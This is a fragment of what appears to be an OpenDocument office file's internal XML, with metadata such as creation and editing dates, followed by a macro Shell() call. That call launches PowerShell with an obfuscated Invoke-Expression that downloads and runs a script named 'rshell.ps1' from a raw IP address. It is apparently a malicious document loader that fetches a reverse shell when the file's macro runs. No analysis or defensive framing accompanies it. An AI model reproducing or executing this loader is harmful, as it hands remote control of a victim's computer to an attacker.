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844" officeooo:paragraph-rsid="001cb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il documents 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2:04:16.213000000</meta:creation-date>
    <dc:date>2024-04-29T00:47:11.092000000</dc:date>
    <meta:editing-duration>PT21M18S</meta:editing-duration>
    <meta:editing-cycles>1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  Shell("cmd /c powershell I''E''X(Ne''w-Obj''ect Net.WebClient).DownloadString('http://172.233.245.47/rshell.ps1')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